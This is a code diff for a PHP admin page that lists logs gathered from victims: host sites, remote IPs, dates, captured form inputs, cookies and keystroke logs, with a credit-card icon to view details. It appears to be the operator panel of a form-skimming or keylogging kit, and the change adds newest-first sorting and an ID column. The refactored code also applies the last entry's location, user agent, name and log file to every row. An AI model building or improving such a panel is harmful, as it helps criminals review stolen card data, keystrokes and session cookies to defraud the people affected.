@@ -102,57 +102,83 @@
     </div>
 
     <!-- TABLE -->
-    <table class="table table-dark table-hover mt-3" id="logsTable">
-        <thead>
-            <tr>
-                <th scope="col">Host <i class="i material-icons">router</i></th>
-                <th scope="col">Remote IP <i class="i material-icons">gps_fixed</i></th>
-                <th scope="col">Date <i class="i material-icons">date_range</i></th>
-                <th scope="col">Input <i class="i material-icons">input</i></th>
-                <th scope="col">Cookies <i class="i material-icons">settings</i></th>
-            </tr>
-        </thead>
-        <tbody>
-            <?php
-            foreach (get_dirs() as $ip_dir) {
-                foreach (get_dirs(explode("/", $ip_dir)[1] . '/') as $date_dir) {
-                    foreach (get_files($date_dir . '/') as $log_file) {
-                        $i = json_decode(file_get_contents($log_file), true);
+<table class="table table-dark table-hover mt-3" id="logsTable">
+    <thead>
+        <tr>
+            <th scope="col">ID</th>
+            <th scope="col">Host <i class="i material-icons">router</i></th>
+            <th scope="col">Remote IP <i class="i material-icons">gps_fixed</i></th>
+            <th scope="col">Date <i class="i material-icons">date_range</i></th>
+            <th scope="col">Input <i class="i material-icons">input</i></th>
+            <th scope="col">Cookies <i class="i material-icons">settings</i></th>
+        </tr>
+    </thead>
+    <tbody>
+        <?php
+        $data = array();
 
-                        $remote_ip = $i["remote_ip"];
-                        $location = $i["location"];
-                        $uagents = $i["uagents"];
-                        $cookies = $i["cookies"];
-                        $name = $i["name"];
-                        $host = $i["host"];
-                        $date = $i["date"];
-                        $time = $i["time"];
-                        $inputs = $i["inputs"];
+        foreach (get_dirs() as $ip_dir) {
+            foreach (get_dirs(explode("/", $ip_dir)[1] . '/') as $date_dir) {
+                foreach (get_files($date_dir . '/') as $log_file) {
+                    $i = json_decode(file_get_contents($log_file), true);
 
-                        // Check if $inputs is empty and skip this row if it is
-                        if (empty($inputs)) {
-                            continue;
-                        }
+                    $remote_ip = $i["remote_ip"];
+                    $location = $i["location"];
+                    $uagents = $i["uagents"];
+                    $cookies = $i["cookies"];
+                    $name = $i["name"];
+                    $host = $i["host"];
+                    $date = $i["date"];
+                    $time = $i["time"];
+                    $inputs = $i["inputs"];
 
-                        $keylogs = str_replace([" <Shift> ", "<TAB>"], ['', '\n'], $i["keyLogs"]);
-
-                        echo "
-                            <tr>
-                                <td><a style='color: white;' href='http://$host'>$host</a></td>
-                                <td>$remote_ip</td>
-                                <td>$time - $date</td>
-                                <td>$inputs</td>
-                                <td>
-                                    <i title='Show information' class='sinfo material-icons' onclick=\"read_log('$remote_ip', '$location', '$host', '$uagents', '$cookies', '$date', '$time', '$name');\">credit_card</i>
-                                    <i title='Remove log' class='rlogs material-icons' onclick=\"remove_log('$log_file', this);\">delete_forever</i>
-                                </td>
-                            </tr>";
-
+                    // Check if $inputs is empty and skip this row if it is
+                    if (empty($inputs)) {
+                        continue;
                     }
+
+                    $keylogs = str_replace([" <Shift> ", "<TAB>"], ['', '\n'], $i["keyLogs"]);
+
+                    // Store data in an array with timestamp for sorting
+                    $timestamp = strtotime("$date $time");
+                    $data[] = [
+                        'host' => $host,
+                        'remote_ip' => $remote_ip,
+                        'date' => $date,
+                        'time' => $time,
+                        'inputs' => $inputs,
+                        'cookies' => $cookies,
+                        'timestamp' => $timestamp,
+                    ];
                 }
             }
-            ?>
-        </tbody>
-    </table>
+        }
+
+        // Sort data by timestamp in descending order
+        usort($data, function ($a, $b) {
+            return $b['timestamp'] - $a['timestamp'];
+        });
+
+        $id = 1; // Initialize ID to 1
+
+        foreach ($data as $row) {
+            echo "
+                <tr>
+                    <td>$id</td>
+                    <td><a style='color: white;' href='http://{$row['host']}'>{$row['host']}</a></td>
+                    <td>{$row['remote_ip']}</td>
+                    <td>{$row['time']} - {$row['date']}</td>
+                    <td>{$row['inputs']}</td>
+                    <td>
+                        <i title='Show information' class='sinfo material-icons' onclick=\"read_log('{$row['remote_ip']}', '$location', '{$row['host']}', '$uagents', '{$row['cookies']}', '{$row['date']}', '{$row['time']}', '$name');\">credit_card</i>
+                        <i title='Remove log' class='rlogs material-icons' onclick=\"remove_log('$log_file', this);\">delete_forever</i>
+                    </td>
+                </tr>";
+
+            $id++; // Increment the ID
+        }
+        ?>
+    </tbody>
+</table>
 </body>
 </html>
